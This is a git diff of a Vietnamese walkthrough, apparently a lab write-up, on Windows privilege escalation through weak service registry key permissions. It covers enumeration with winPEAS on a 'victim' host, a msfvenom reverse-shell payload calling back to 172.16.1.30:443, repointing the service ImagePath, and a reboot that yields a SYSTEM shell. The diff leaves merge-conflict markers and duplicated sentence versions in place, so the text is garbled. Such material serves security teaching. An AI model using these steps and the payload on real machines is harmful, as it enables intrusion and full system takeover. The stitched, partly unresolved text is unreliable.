@@ -72,7 +72,7 @@ Get-Acl -Path hklm:\System\CurrentControlSet\services\Juggernaut | Format-List
 Có lẽ cách dễ nhất để tìm kiếm các quyền khóa đăng ký dịch vụ yếu là sử dụng tập lệnh liệt kê leo thang đặc quyền cuối cùng: winPEAS.exe
 Tải bản sao winPEASx64.exe xuống nạn nhân.
 
-<<<<<<< HEAD
+
 Sau khi thực thi winPEAS, tôi sẽ tìm thấy mọi khóa đăng ký dịch vụ bị định cấu hình sai trong phần Thông tin dịch vụ .
 
 Sau khi đã tìm được khóa ta bằng đầu khai thác
@@ -87,7 +87,7 @@ Sau khi thực thi winPEAS, chúng tôi sẽ tìm thấy mọi khóa đăng ký 
 Sau khi đã tìm được khóa ta bằng đầu khai thác
 
 # Liệt kê khóa đăng ký dịch vụ yếu mà chúng tôi tìm thấy
->>>>>>> 0119fc48de910bff1b699662a6229f1c22334dba
+
 
 Sau khi tìm thấy một khóa đăng ký dịch vụ thú vị có quyền yếu, tôi cần thu thập thông tin về dịch vụ và tệp thực thi mà nó trỏ tới.
 Chúng ta có thể liệt kê dịch vụ trực tiếp bằng lệnh cmd.exe hoặc PowerShell.
@@ -119,7 +119,6 @@ Từ kết quả đầu ra, ta có thể thấy rằng nhóm được liệt kê
 
 Vì tôi có quyền sửa đổi khóa đăng ký nên tôi có thể thay đổi ImagePath để trỏ đến tệp mà tôi có quyền kiểm soát.
 
-<<<<<<< HEAD
 Do dịch vụ này tự động khởi động nên tôi sẽ cần kích hoạt một sự kiện để khởi động lại dịch vụ hoặc cố gắng dừng rồi khởi động lại. Thật may mắn cho tôi, trước đó tôi đã thấy rằng người dùng chuẩn của tôi có SeShutdownPrivilege, nghĩa là tôi có thể khởi động lại hệ thống để buộc dịch vụ khởi động lại.
 
 Khai thác khóa đăng ký dịch vụ yếu mà tôi tìm thấy
@@ -128,7 +127,6 @@ Do dịch vụ này tự động khởi động nên chúng tôi sẽ cần kíc
 ![image-27](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/4e4ac5a1-1c0b-4090-997c-3f0263a93c3a)
 
 # Khai thác khóa đăng ký dịch vụ yếu mà chúng tôi tìm thấy
->>>>>>> 0119fc48de910bff1b699662a6229f1c22334dba
 
 ## Tạo một tệp thực thi độc hại
 
@@ -140,12 +138,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --p
 ```
 ![image-17](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/29c48bba-dca2-44e2-87c4-296bbd7c1e02)
 
-<<<<<<< HEAD
+
 Khi tệp thực thi đã sẵn sàng hoạt động, tôi cần chuyển nó sang máy nạn nhân. Vì chia sẻ vẫn đang mở nên hãy sử dụng nó.
 =======
 Khi tệp thực thi đã sẵn sàng hoạt động, chúng tôi cần chuyển nó sang máy nạn nhân. Vì chia sẻ vẫn đang mở nên hãy sử dụng nó.
 ![image-18](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/eacdcb4c-d7d2-49f7-9396-5c0bce1ac6b3)
->>>>>>> 0119fc48de910bff1b699662a6229f1c22334dba
 
 # Khai thác Khóa đăng ký dịch vụ yếu để lấy SYSTEM Shell
 
@@ -163,11 +160,9 @@ Với mọi thứ đã sẵn sàng, việc còn lại chỉ là khởi động l
 ```
 shutdown /r /t 0
 ```
-<<<<<<< HEAD
-
 Máy khởi động lại và lớp vỏ ban đầu của tôi bị cắt ra; tuy nhiên, sau khoảng 20 giây, shell HỆ THỐNG sẽ xuất hiện trên trình nghe của tôi!
 =======
 Máy khởi động lại và lớp vỏ ban đầu của chúng tôi bị cắt ra; tuy nhiên, sau khoảng 20 giây, shell HỆ THỐNG sẽ xuất hiện trên trình nghe của chúng tôi!
 
 ![image-29](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/696d5873-a6a9-4004-9737-4a90b653c774)
->>>>>>> 0119fc48de910bff1b699662a6229f1c22334dba
+
